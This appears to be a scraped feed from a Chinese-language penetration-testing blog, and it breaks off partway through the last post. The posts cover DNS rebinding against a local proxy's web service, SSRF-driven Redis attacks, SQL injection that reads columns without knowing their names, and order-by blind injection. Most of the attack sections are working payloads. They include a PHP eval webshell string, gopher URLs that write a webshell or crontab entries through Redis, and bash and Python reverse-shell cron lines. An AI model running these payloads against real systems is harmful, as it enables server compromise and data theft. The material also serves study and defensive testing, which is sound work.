rebind.xyz.pw的时候其中的cname是shell，但是本地ping的时候出现uknow host的错误 dig rebind.xyz.pw; &lt;&lt;&gt;&gt; DiG 9.8.3-P1 &lt;&lt;&gt;&gt; rebind.xyz.pw;; global options: +cmd;; Got answer:;; -&gt;&gt;HEADER&lt;&lt;- opcode: QUERY, status: NOERROR, id: 56051;; flags: qr rd ra; QUERY: 1, ANSWER: 1, AUTHORITY: 0, ADDITIONAL: 0;; QUESTION SECTION:;rebind.xyz.pw.INA;; ANSWER SECTION:rebind.xyz.pw.300INCNAME&lt;?&#x3D;eval\(\$_POST[1]?&gt;.xyz.pw.;; Query time: 1266 msec;; SERVER: 202.101.172.35#53(202.101.172.35);; WHEN: Wed Dec  6 15:52:56 2017;; MSG SIZE  rcvd: 66复现失败<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>======<br>2019/06/05更新:</p><p>这几天上网只能用v2rayX，看到在8070端口起了一个http服务，想起来微信爆出来的可以利用DNS Rebinding获取微信号的内容，看了下本地的服务跟微信插件的类似，甚至用的都是GCDWebServer，开始本地捣鼓一下能不能获取到配置文件。最终测试成功，但是得在页面等1分多钟，因为会有dns解析的缓存。</p><p>测试代码搬的: <a href="https://0x0d.im/archives/get-visitor-qq-number-through-dns-rebinding.html">https://0x0d.im/archives/get-visitor-qq-number-through-dns-rebinding.html</a></p><pre class="line-numbers language-none"><code class="language-none">&lt;!DCTYPE html&gt;    &lt;html lang&#x3D;&quot;en&quot;&gt;    &lt;head&gt;        &lt;meta charset&#x3D;&quot;UTF-8&quot;&gt;        &lt;title&gt;Rebind Test&lt;&#x2F;title&gt;    &lt;&#x2F;head&gt;    &lt;body&gt;        &lt;script src&#x3D;&quot;http:&#x2F;&#x2F;upcdn.b0.upaiyun.com&#x2F;libs&#x2F;jquery&#x2F;jquery-2.0.3.min.js&quot;&gt;&lt;&#x2F;script&gt;        &lt;script&gt;        function GetUin()&#123;    console.log(&quot;Testing&quot;);            $.ajax(&#123;            url: &quot;http:&#x2F;&#x2F;rebind.xyz.xyz:8070&#x2F;config.json&quot;,            type: &quot;GET&quot;,            dataType: &quot;text&quot;,            success: function(data)&#123;                alert(data);console.log(data);                &#125;            &#125;);        &#125;        setTimeout(&quot;GetUin()&quot;, 5000);setTimeout(&quot;GetUin()&quot;, 7000);setTimeout(&quot;GetUin()&quot;, 8000);setTimeout(&quot;GetUin()&quot;, 30000);        setTimeout(&quot;GetUin()&quot;, 60000);        setTimeout(&quot;GetUin()&quot;, 90000);        &lt;&#x2F;script&gt;    &lt;&#x2F;body&gt;    &lt;&#x2F;html&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>坑:</p><p>昨天测了大半天，中间只成功了一次，大概是踩狗屎了。<br>chrome下做的测试，做完清缓存:</p><ol><li>chrome://net-internals/#dns 和 chrome://net-internals/#sockets</li><li>chrome的清理缓存文件，历史纪录什么的</li><li>dscacheutil -flushcache;sudo killall -HUP mDNSResponder</li></ol><p>rebind.xyz.xyz的ttl我设置了为2分钟，找了半天没有设置为0的dns解析服务。最后测试成功，撒花，怪不得微信插件那个要等1分多钟，测完给作者提了个bug，貌似是注册这么久第一次给人提bug。</p><p>这种本地起web服务的很容易受到攻击，就我查到的有:</p><ol><li>visual studio远程命令执行</li><li>暴雪的一款游戏什么的</li><li>QQ的获取QQ号码和微信插件获取好友列表</li></ol><ul><li><a href="https://joychou.org/web/use-dnsrebinding-to-bypass-ssrf-in-java.html">https://joychou.org/web/use-dnsrebinding-to-bypass-ssrf-in-java.html</a></li><li><a href="https://ricterz.me/posts/Use%20DNS%20Rebinding%20to%20Bypass%20IP%20Restriction">https://ricterz.me/posts/Use%20DNS%20Rebinding%20to%20Bypass%20IP%20Restriction</a></li><li><a href="https://virusdefender.net/index.php/archives/685/">https://virusdefender.net/index.php/archives/685/</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> Learning </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>redis hacker</title>
      <link href="/2017/12/05/redis-crontab.html"/>
      <url>/2017/12/05/redis-crontab.html</url>
      
        <content type="html"><![CDATA[<p>Orange在BH大会的paper上面这么说的:</p><pre class="line-numbers language-none"><code class="language-none">Protocols that are suitable to smuggle  HTTP based protocol:  Elastic, CouchDB, Mongodb, Docker    Text-based protocol:    FTP, SMTP, Redis, Memcached<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>Ph在他<a href="https://www.leavesongs.com/PENETRATION/getshell-via-ssrf-and-redis.html">https://www.leavesongs.com/PENETRATION/getshell-via-ssrf-and-redis.html</a>里面也提到过，redis的协议是简单的协议流，关于这一点可以查看redis的官方解释: <a href="https://redis.io/topics/protocol">https://redis.io/topics/protocol</a></p><p><a href="https://blog.chaitin.cn/gopher-attack-surfaces/">https://blog.chaitin.cn/gopher-attack-surfaces/</a><br>在这篇文章里面提到使用gopher来攻击redis，使用的步骤是这样的：</p><ul><li>redis-server启动的时候监听6378端口 <code>redis-server /etc/redis/redis.conf --port 6378</code></li><li>运行<code>socat -v tcp-listen:6379,fork tcp-connetc:localhost:6378</code></li><li>然后再正常使用redis来攻击</li></ul><h2 id="写shell"><a href="#写shell" class="headerlink" title="写shell"></a>写shell</h2><p>相当于把6379的端口流量转发到6378，而redis-server监听的是6378端口，使用redis-server来写shell是这样的步骤:</p><pre class="line-numbers language-none"><code class="language-none">redis-cli -h 127.0.0.1 flushallredis-cli -h 127.0.0.1 config set dir &#x2F;var&#x2F;wwwredis-cli -h 127.0.0.1 config set dbfilename shell.phpredis-cli -h 127.0.0.1 set webshell &quot;&lt;?php phpinfo();?&gt;&quot;redis-cli -h 127.0.0.1 save <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>然后得到的数据流如下：</p><pre class="line-numbers language-none"><code class="language-none">*1\r$8\rflushall\r*4\r$6\rconfig\r$3\rset\r$3\rdir\r$8\r&#x2F;var&#x2F;www\r*4\r$6\rconfig\r$3\rset\r$10\rdbfilename\r$9\rshell.php\r*3\r$3\rset\r$3\rweb\r$18\r&lt;?php phpinfo();?&gt;\r*1\r$4\rsave\r<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>参考joychou写cron的脚本转换，python转换脚本如下:</p><pre class="line-numbers language-none"><code class="language-none">f &#x3D; open(&#39;&#x2F;xxxxx&#x2F;Desktop&#x2F;3.txt&#39;, &#39;r&#39;)s &#x3D; &#39;&#39;for line in f.readlines():# if line[-3:-1] &#x3D;&#x3D; r&quot;\r&quot;:# print line# print line[-3:-1]if line[-3:-1] &#x3D;&#x3D; r&quot;\r&quot;:line &#x3D; line.replace(r&quot;\r&quot;, &quot;%0d%0a&quot;)line &#x3D; line.replace(&quot;\n&quot;, &#39;&#39;)s &#x3D; s + lineprint s.replace(&quot;$&quot;, &quot;%24&quot;)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>如上的写shell数据流经过编码如下(注意php的shell那里，经过上面转换还是尖括号，两个尖括号和<code>;</code>要经过url编码，然后使用curl直接发送如下，我也不知道为啥<code>$</code>还要编码，知道的同学请告知，谢谢）:</p><pre class="line-numbers language-none"><code class="language-none">curl -v &quot;gopher:&#x2F;&#x2F;127.0.0.1:6379&#x2F;_*1%0d%0a%248%0d%0aflushall%0d%0a*4%0d%0a%246%0d%0aconfig%0d%0a%243%0d%0aset%0d%0a%243%0d%0adir%0d%0a%248%0d%0a&#x2F;var&#x2F;www%0d%0a*4%0d%0a%246%0d%0aconfig%0d%0a%243%0d%0aset%0d%0a%2410%0d%0adbfilename%0d%0a%249%0d%0ashell.php%0d%0a*3%0d%0a%243%0d%0aset%0d%0a%243%0d%0aweb%0d%0a%2418%0d%0a%3C%3Fphp phpinfo()%3B%3F%3E%0d%0a*1%0d%0a%244%0d%0asave%0d%0a&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>然后上面的payload在存在ssrf的时候，使用发送之前要url编码一次，发送即可得到shell。</p><pre class="line-numbers language-none"><code class="language-none">gopher%3A%2F%2F127.0.0.1%3A6378%2F_*1%250d%250a%25248%250d%250aflushall%250d%250a*4%250d%250a%25246%250d%250aconfig%250d%250a%25243%250d%250aset%250d%250a%25243%250d%250adir%250d%250a%25248%250d%250a%2Fvar%2Fwww%250d%250a*4%250d%250a%25246%250d%250aconfig%250d%250a%25243%250d%250aset%250d%250a%252410%250d%250adbfilename%250d%250a%25249%250d%250ashell.php%250d%250a*3%250d%250a%25243%250d%250aset%250d%250a%25243%250d%250aweb%250d%250a%252418%250d%250a%253C%253Fphp%20phpinfo()%253B%253F%253E%250d%250a*1%250d%250a%25244%250d%250asave%250d%250a<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="写定时任务"><a href="#写定时任务" class="headerlink" title="写定时任务"></a>写定时任务</h3><p>测试环境：<br>ubuntu  14.04.5 LTS<br>centos  6.7</p><p>直接crontab -e编辑:</p><pre class="line-numbers language-none"><code class="language-none">*&#x2F;1 * * * * bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;127.0.0.1&#x2F;2333 0&gt;&amp;1<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>在ubuntu下不会反弹成功，centos可以反弹成功。</p><p>改为Python反弹:</p><pre class="line-numbers language-none"><code class="language-none">*&#x2F;1 * * * * python -c &#39;import socket,subprocess,os;s&#x3D;socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;127.0.0.1&quot;,8080));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p&#x3D;subprocess.call([&quot;&#x2F;bin&#x2F;sh&quot;,&quot;-i&quot;]);&#39;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>ubuntu和Linux均反弹成功。</p><ol start="3"><li>编辑/etc/crontab，使用上面两个payload，注意［这里定时任务需要加user］</li></ol><pre class="line-numbers language-none"><code class="language-none">*&#x2F;1 * * * * root  bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;127.0.0.1&#x2F;2333 0&gt;&amp;1<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>在ubuntu下，bash反弹失败，python反弹成功。<br>在CentOS下，两个均成功。</p><ol start="4"><li>编辑/var/spool/cron/root文件，使用上面两个反弹shell:</li></ol><p>在Ubuntu下，两个均失败。<br>在CentOS下，两个均成功。</p><ol start="5"><li>编辑/var/spool/cron/crontabs/root(Centos默认没有这个路径），所以这个是ubuntu测试：</li></ol><p>bash反弹失败<br>python反弹成功</p><p>Centos的定式任务在<code>/var/spool/cron/root</code><br>Ubuntu定时任务<code>/var/spool/cron/crontabs/root</code></p><p>所以如果redis里面写shell，<a href="https://joychou.org/web/hackredis-enhanced-edition-script.html">https://joychou.org/web/hackredis-enhanced-edition-script.html</a>，由于使用redis写crontab的时候，创建的文件权限是644，ubuntu无法执行，所以ubuntu下使用redis写shell是无法成功的。</p><p>写入/etc/crontab的时候，由于存在乱码，所以会导致ubuntu不能正确识别，导致定时任务失败。</p><p>所以以上两点来看，ubuntu利用写文件执行crontab不会成功：</p><ul><li>如果写/etc/crontab，语法不识别</li><li>如果写<code>/var/spool/cron/crontabs/root</code>，权限不是root，语法不识别。</li></ul><p>如果只能写文件，想反弹shell通用，比如redis的未授权访问（ubuntu这种情况下无解）：</p><ol><li>写/etc/crontab文件</li><li>使用python反弹shell脚本</li></ol><p>如果可以执行命令，想反弹shell，比如docker remote api未授权访问：</p><ol><li>写当前用户下crontab或者写<code>/etc/crontab</code>也可以。</li><li>使用python反弹shell脚本</li></ol><p>下面这个是从<a href="https://joychou.org/web/phpssrf.html">https://joychou.org/web/phpssrf.html</a>这里搬来的代码，出来的结果，我这里发现需要对其中的<code>$</code>编码（另外说一句，这个<code>$</code>直接写在md之后，会改变文字的意思。貌似是个特殊字符。</p><pre class="line-numbers language-none"><code class="language-none">#coding: utf-8#author: JoyChouimport sysexp &#x3D; &#39;&#39;with open(&#39;&#x2F;Users&#x2F;xxx&#x2F;Desktop&#x2F;1.txt&#39;) as f:    for line in f.readlines():        if line[0] in &#39;&gt;&lt;+&#39;:            continue        # 判断倒数第2、3字符串是否为\r        elif line[-3:-1] &#x3D;&#x3D; r&#39;\r&#39;:            # 如果该行只有\r，将\r替换成%0a%0d%0a            if len(line) &#x3D;&#x3D; 3:                exp &#x3D; exp + &#39;%0a%0d%0a&#39;            else:                line &#x3D; line.replace(r&#39;\r&#39;, &#39;%0d%0a&#39;)                # 去掉最后的换行符                line &#x3D; line.replace(&#39;\n&#39;, &#39;&#39;)                exp &#x3D; exp + line        # 判断是否是空行，空行替换为%0a        elif line &#x3D;&#x3D; &#39;\x0a&#39;:            exp &#x3D; exp + &#39;%0a&#39;        else:            line &#x3D; line.replace(&#39;\n&#39;, &#39;&#39;)            exp &#x3D; exp + lineprint exp.replace(&#39;$&#39;, &#39;%24&#39;)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>攻击的时候时候，使用的是这样的exp:</p><pre class="line-numbers language-none"><code class="language-none">config set dir &#x2F;var&#x2F;spool&#x2F;cronconfig set dbfilename rootset www &quot;\n\n*&#x2F;1 * * * * bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;127.0.0.1&#x2F;2333 0&gt;&amp;1\n\n&quot;save<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>经过编码之后，得到的exp:</p><pre class="line-numbers language-none"><code class="language-none">gopher:&#x2F;&#x2F;127.0.0.1:6379&#x2F;_*4%0d%0a%246%0d%0aconfig%0d%0a%243%0d%0aset%0d%0a%243%0d%0adir%0d%0a%2415%0d%0a&#x2F;var&#x2F;spool&#x2F;cron%0d%0a*4%0d%0a%246%0d%0aconfig%0d%0a%243%0d%0aset%0d%0a%2410%0d%0adbfilename%0d%0a%244%0d%0aroot%0d%0a*3%0d%0a%243%0d%0aset%0d%0a%243%0d%0awww%0d%0a%2455%0d%0a%0a%0a*&#x2F;1 * * * * bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;127.0.0.1&#x2F;2333 0&gt;&amp;1%0a%0a%0d%0a*1%0d%0a%244%0d%0asave%0d%0a<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>然后上面的再经过http编码即可攻击成功。</p><ul><li><a href="https://www.hugeserver.com/kb/install-redis-centos/">https://www.hugeserver.com/kb/install-redis-centos/</a></li><li><a href="https://joychou.org/web/phpssrf.html">https://joychou.org/web/phpssrf.html</a></li><li><a href="https://www.leavesongs.com/PENETRATION/write-webshell-via-redis-server.html">https://www.leavesongs.com/PENETRATION/write-webshell-via-redis-server.html</a></li><li><a href="http://vinc.top/2016/11/24/%E3%80%90ssrf%E3%80%91ssrfgopher%E6%90%9E%E5%AE%9A%E5%86%85%E7%BD%91%E6%9C%AA%E6%8E%88%E6%9D%83redis/">http://vinc.top/2016/11/24/%E3%80%90ssrf%E3%80%91ssrfgopher%E6%90%9E%E5%AE%9A%E5%86%85%E7%BD%91%E6%9C%AA%E6%8E%88%E6%9D%83redis/</a></li><li><a href="https://blog.chaitin.cn/gopher-attack-surfaces/">https://blog.chaitin.cn/gopher-attack-surfaces/</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> Pentest </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>SQL注入绕过未知字段名的技巧</title>
      <link href="/2017/11/28/sql-bypass-unknown.html"/>
      <url>/2017/11/28/sql-bypass-unknown.html</url>
      
        <content type="html"><![CDATA[<p><a href="http://blog.7ell.me/2017/05/30/2017-DDCTF-SQL%E6%B3%A8%E5%85%A5%E4%B9%8B%E8%BF%87%E6%BB%A4%E5%88%97%E5%90%8Dget%E6%95%B0%E6%8D%AE/">http://blog.7ell.me/2017/05/30/2017-DDCTF-SQL注入之过滤列名get数据/</a> </p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">mysql<span class="token operator">></span> <span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span> <span class="token punctuation">(</span><span class="token keyword">select</span> <span class="token number">1</span><span class="token punctuation">)</span>a<span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token keyword">select</span> <span class="token number">2</span><span class="token punctuation">)</span>b<span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token keyword">select</span> <span class="token number">3</span><span class="token punctuation">)</span>c<span class="token punctuation">;</span><span class="token operator">+</span><span class="token comment">---+---+---+</span><span class="token operator">|</span> <span class="token number">1</span> <span class="token operator">|</span> <span class="token number">2</span> <span class="token operator">|</span> <span class="token number">3</span> <span class="token operator">|</span><span class="token operator">+</span><span class="token comment">---+---+---+</span><span class="token operator">|</span> <span class="token number">1</span> <span class="token operator">|</span> <span class="token number">2</span> <span class="token operator">|</span> <span class="token number">3</span> <span class="token operator">|</span><span class="token operator">+</span><span class="token comment">---+---+---+</span><span class="token number">1</span> <span class="token keyword">row</span> <span class="token operator">in</span> <span class="token keyword">set</span> <span class="token punctuation">(</span><span class="token number">0.00</span> sec<span class="token punctuation">)</span>mysql<span class="token operator">></span> <span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span> <span class="token punctuation">(</span><span class="token keyword">select</span> <span class="token number">1</span><span class="token punctuation">)</span>a<span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token keyword">select</span> <span class="token number">2</span><span class="token punctuation">)</span>b<span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token keyword">select</span> <span class="token number">3</span><span class="token punctuation">)</span>c <span class="token keyword">union</span> <span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span> admin<span class="token punctuation">;</span><span class="token operator">+</span><span class="token comment">---+--------+----------------------------------+</span><span class="token operator">|</span> <span class="token number">1</span> <span class="token operator">|</span> <span class="token number">2</span>      <span class="token operator">|</span> <span class="token number">3</span>                                <span class="token operator">|</span><span class="token operator">+</span><span class="token comment">---+--------+----------------------------------+</span><span class="token operator">|</span> <span class="token number">1</span> <span class="token operator">|</span> <span class="token number">2</span>      <span class="token operator">|</span> <span class="token number">3</span>                                <span class="token operator">|</span><span class="token operator">|</span> <span class="token number">1</span> <span class="token operator">|</span> admin  <span class="token operator">|</span> e10adc3949ba59abbe56e057f20f883e <span class="token operator">|</span><span class="token operator">|</span> <span class="token number">2</span> <span class="token operator">|</span> admin2 <span class="token operator">|</span> <span class="token number">7195</span>ca99696b5a896d067a0fa9dc61a6 <span class="token operator">|</span><span class="token operator">|</span> <span class="token number">3</span> <span class="token operator">|</span> admin3 <span class="token operator">|</span> <span class="token number">7195</span>C                            <span class="token operator">|</span><span class="token operator">+</span><span class="token comment">---+--------+----------------------------------+</span><span class="token number">4</span> <span class="token keyword">rows</span> <span class="token operator">in</span> <span class="token keyword">set</span> <span class="token punctuation">(</span><span class="token number">0.00</span> sec<span class="token punctuation">)</span>mysql<span class="token operator">></span> <span class="token keyword">select</span> e<span class="token punctuation">.</span><span class="token number">3</span> <span class="token keyword">from</span> <span class="token punctuation">(</span><span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span> <span class="token punctuation">(</span><span class="token keyword">select</span> <span class="token number">1</span><span class="token punctuation">)</span>a<span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token keyword">select</span> <span class="token number">2</span><span class="token punctuation">)</span>b<span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token keyword">select</span> <span class="token number">3</span><span class="token punctuation">)</span>c <span class="token keyword">union</span> <span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span> admin<span class="token punctuation">)</span>e<span class="token punctuation">;</span><span class="token operator">+</span><span class="token comment">----------------------------------+</span><span class="token operator">|</span> <span class="token number">3</span>                                <span class="token operator">|</span><span class="token operator">+</span><span class="token comment">----------------------------------+</span><span class="token operator">|</span> <span class="token number">3</span>                                <span class="token operator">|</span><span class="token operator">|</span> e10adc3949ba59abbe56e057f20f883e <span class="token operator">|</span><span class="token operator">|</span> <span class="token number">7195</span>ca99696b5a896d067a0fa9dc61a6 <span class="token operator">|</span><span class="token operator">|</span> <span class="token number">7195</span>C                            <span class="token operator">|</span><span class="token operator">+</span><span class="token comment">----------------------------------+</span><span class="token number">4</span> <span class="token keyword">rows</span> <span class="token operator">in</span> <span class="token keyword">set</span> <span class="token punctuation">(</span><span class="token number">0.00</span> sec<span class="token punctuation">)</span>mysql<span class="token operator">></span> <span class="token keyword">select</span> e<span class="token punctuation">.</span><span class="token number">3</span> <span class="token keyword">from</span> <span class="token punctuation">(</span><span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span> <span class="token punctuation">(</span><span class="token keyword">select</span> <span class="token number">1</span><span class="token punctuation">)</span>a<span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token keyword">select</span> <span class="token number">2</span><span class="token punctuation">)</span>b<span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token keyword">select</span> <span class="token number">3</span><span class="token punctuation">)</span>c <span class="token keyword">union</span> <span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span> admin<span class="token punctuation">)</span>e <span class="token keyword">limit</span> <span class="token number">1</span> <span class="token keyword">offset</span> <span class="token number">3</span><span class="token punctuation">;</span><span class="token operator">+</span><span class="token comment">-------+</span><span class="token operator">|</span> <span class="token number">3</span>     <span class="token operator">|</span><span class="token operator">+</span><span class="token comment">-------+</span><span class="token operator">|</span> <span class="token number">7195</span>C <span class="token operator">|</span><span class="token operator">+</span><span class="token comment">-------+</span><span class="token number">1</span> <span class="token keyword">row</span> <span class="token operator">in</span> <span class="token keyword">set</span> <span class="token punctuation">(</span><span class="token number">0.00</span> sec<span class="token punctuation">)</span>mysql<span class="token operator">></span> <span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span> admin <span class="token keyword">where</span> id<span class="token operator">=</span><span class="token number">1</span> <span class="token keyword">union</span> <span class="token keyword">select</span> <span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">;</span><span class="token operator">+</span><span class="token comment">----+----------+----------------------------------+</span><span class="token operator">|</span> id <span class="token operator">|</span> username <span class="token operator">|</span> password                         <span class="token operator">|</span><span class="token operator">+</span><span class="token comment">----+----------+----------------------------------+</span><span class="token operator">|</span>  <span class="token number">1</span> <span class="token operator">|</span> admin    <span class="token operator">|</span> e10adc3949ba59abbe56e057f20f883e <span class="token operator">|</span><span class="token operator">|</span>  <span class="token number">1</span> <span class="token operator">|</span> <span class="token number">2</span>        <span class="token operator">|</span> <span class="token number">3</span>                                <span class="token operator">|</span><span class="token operator">+</span><span class="token comment">----+----------+----------------------------------+</span><span class="token number">2</span> <span class="token keyword">rows</span> <span class="token operator">in</span> <span class="token keyword">set</span> <span class="token punctuation">(</span><span class="token number">0.01</span> sec<span class="token punctuation">)</span>mysql<span class="token operator">></span> <span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span> admin <span class="token keyword">where</span> id<span class="token operator">=</span><span class="token number">1</span> <span class="token keyword">union</span> <span class="token keyword">select</span> <span class="token punctuation">(</span><span class="token keyword">select</span> e<span class="token punctuation">.</span><span class="token number">3</span> <span class="token keyword">from</span> <span class="token punctuation">(</span><span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span> <span class="token punctuation">(</span><span class="token keyword">select</span> <span class="token number">1</span><span class="token punctuation">)</span>a<span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token keyword">select</span> <span class="token number">2</span><span class="token punctuation">)</span>b<span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token keyword">select</span> <span class="token number">3</span><span class="token punctuation">)</span>c <span class="token keyword">union</span> <span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span> admin<span class="token punctuation">)</span>e <span class="token keyword">limit</span> <span class="token number">1</span> <span class="token keyword">offset</span> <span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">;</span><span class="token operator">+</span><span class="token comment">-------+----------+----------------------------------+</span><span class="token operator">|</span> id    <span class="token operator">|</span> username <span class="token operator">|</span> password                         <span class="token operator">|</span><span class="token operator">+</span><span class="token comment">-------+----------+----------------------------------+</span><span class="token operator">|</span> <span class="token number">1</span>     <span class="token operator">|</span> admin    <span class="token operator">|</span> e10adc3949ba59abbe56e057f20f883e <span class="token operator">|</span><span class="token operator">|</span> <span class="token number">7195</span>C <span class="token operator">|</span> <span class="token number">2</span>        <span class="token operator">|</span> <span class="token number">3</span>                                <span class="token operator">|</span><span class="token operator">+</span><span class="token comment">-------+----------+----------------------------------+</span><span class="token number">2</span> <span class="token keyword">rows</span> <span class="token operator">in</span> <span class="token keyword">set</span> <span class="token punctuation">(</span><span class="token number">0.00</span> sec<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> SQL </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>基于order by的盲注</title>
      <link href="/2017/11/23/order-by-blind.html"/>
      <url>/2017/11/23/order-by-blind.html</url>
      
        <content type="html"><![CDATA[<p><a href="http://wonderkun.cc/index.html/?p=547">http://wonderkun.cc/index.html/?p=547</a><br>源代码:</p><pre class="line-numbers language-none"><code class="language-none">&lt;?php  $dbhost &#x3D; &quot;172.19.0.2&quot;;  $dbuser &#x3D; &quot;root&quot;;  $dbpass &#x3D; &quot;root&quot;;  $db &#x3D; &quot;vul&quot;;  $conn &#x3D; mysqli_connect($dbhost,$dbuser,$dbpass,$db);  mysqli_set_charset($conn,&quot;utf8&quot;);   &#x2F;* sql      create  table &#96;admin&#96; (        &#96;id&#96; int(10) not null primary key auto_increment,        &#96;username&#96; varchar(20) not null ,        &#96;password&#96; varchar(32) not null     );  *&#x2F;function   filter($str)&#123;      $filterlist &#x3D; &quot;&#x2F;\(|\)|username|password|where|      case|when|like|regexp|into|limit|&#x3D;|for|;&#x2F;&quot;;      if(preg_match($filterlist,strtolower($str)))&#123;        die(&quot;illegal input!&quot;);      &#125;      return $str;  &#125;$username &#x3D; isset($_POST[&#39;username&#39;])?filter($_POST[&#39;username&#39;]):die(&quot;please input username!&quot;);$password &#x3D; isset($_POST[&#39;password&#39;])?filter($_POST[&#39;password&#39;]):die(&quot;please input password!&quot;);$sql &#x3D; &quot;select * from admin where  username &#x3D; &#39;$username&#39; and password &#x3D; &#39;$password&#39; &quot;; $res &#x3D; $conn -&gt; query($sql);if($res-&gt;num_rows&gt;0)&#123;  $row &#x3D; $res -&gt; fetch_assoc();  if($row[&#39;id&#39;])&#123;     echo $row[&#39;username&#39;];  &#125;&#125;else&#123;   echo &quot;The content in the password column is the &quot;;&#125; ?&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>在上面这个源代码里面，要首先猜解出username的值，文章里面给的payload是</p><pre class="line-numbers language-none"><code class="language-none">username&#x3D;&#39;^1^1#&amp;password&#x3D;1<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>其实上面的payload初看是不太懂的，才想起来mysql里面弱类型转换的问题，如下：</p><p><img src="/2017/11/23/order-by-blind/2.png"></p><p>就是sql语句查询如果username是0的话，所有结果就出来了，那么把这个username变成0，上面的语句都可以做到：</p><pre class="line-numbers language-none"><code class="language-none">select * from admin where username&#x3D;&#39;&#39;*0select * from admin where username&#x3D;&#39;&#39;&#x2F;2select * from admin where username&#x3D;&#39;&#39;^1^1select * from admin where username&#x3D;&#39;&#39;-&#39;&#39;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>然后是基于order by的盲注：</p><p>首先是基本知识:</p><pre class="line-numbers language-none"><code class="language-none">import 